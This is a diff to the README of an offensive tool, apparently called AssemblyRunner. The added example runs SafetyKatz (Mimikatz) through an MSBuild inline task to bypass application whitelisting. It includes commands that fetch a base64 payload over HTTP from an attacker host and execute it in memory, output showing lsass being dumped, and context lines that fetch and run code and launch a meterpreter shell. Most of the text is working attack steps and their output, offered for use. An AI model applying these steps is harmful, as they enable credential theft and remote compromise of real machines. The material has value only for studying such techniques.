@@ -9,6 +9,57 @@ AssemblyRunner.exe -net http://IP/seatbelt.b64 "BasicOSInfo"
 Result: File is retreived over HTTP in-memory, base64 decoded, and then executed with the BasicOSInfo argument.
 
 EXAMPLE:
+Run SafetyKatz (Mimikatz) through an inline task in Msbuild 
+Goal: Bypass application Whitelisting using AssemblyRunner and an inline task in Msbuild
+Kali:
+cat SafetyKatz.exe | base64 -w0 > safetykatz.b64
+cat AssemblyRunner.exe | base64 -w0 > assemblyrunner.b64
+Host safetykatz.b64 on a webserver like Apache or Python Simple HTTP Server etc.
+Transfer MsbuildInline.xml and assemblyrunner.b64 to target machine
+Windows:
+Alter the MsbuildInline.xml to look like the following:
+			 //Below Two lines get commented if args needed
+			 //object o = a.CreateInstance(method.Name);
+       //method.Invoke(o, null);
+			 
+			 //If Args are required uncomment below two lines and comment above line
+			 string args1 = "-net";
+			 string args2 = "http://IPAddress/sk.b64";
+			 string args3 = "\"test\"";
+			 a.EntryPoint.Invoke(null, new object[] { new string[] { args1, args2, args3 } });
+
+copy C:\Windows\Microsoft.NET\v4.0.30319\MSBuild.exe .
+MsBuild.exe MsbuildInline.xml
+Microsoft (R) Build Engine version 4.7.2053.0
+[Microsoft .NET Framework, version 4.0.30319.42000]
+Copyright (C) Microsoft Corporation. All rights reserved.
+
+Build started 10/17/2018 9:22:19 AM.
+Hello
+Got String
+Convert From b64
+Load Assembly
+Get Entry Point
+Void Main(System.String[])
+
+[*] Dumping lsass (532) to C:\Windows\Temp\debug.bin
+[+] Dump successful!
+
+[*] Executing loaded Mimikatz PE
+
+  .#####.   mimikatz 2.1.1 (x64) built on Jul  7 2018 03:36:26 - lil!
+ .## ^ ##.  "A La Vie, A L'Amour" - (oe.eo)
+ ## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
+ ## \ / ##       > http://blog.gentilkiwi.com/mimikatz
+ '## v ##'       Vincent LE TOUX             ( vincent.letoux@gmail.com )
+  '#####'        > http://pingcastle.com / http://mysmartlogon.com   ***/
+
+mimikatz # Opening : 'C:\Windows\Temp\debug.bin' file for minidump...
+
+
+
+
+EXAMPLE:
 Compile a C# binary, such as AssemblyRunner/AssemblyRunner/Launchers/shellcodelauncher.cs that is included in this repo to get a meterpreter shell.
 Goal Remotely execute a C# Assembly without touching disk and gain a remote shell.
 Kali:
@@ -37,5 +88,4 @@ Windows Target System:
 AssemblyRunner.exe -rdecno PASSWORD http://IP/encrypt_local.txt
 (Enjoy your Shell)
 RESULT: Encrypted file is retreived over HTTP in-memory, decrypted, base64 decoded, and then executed without Arguments
-
 
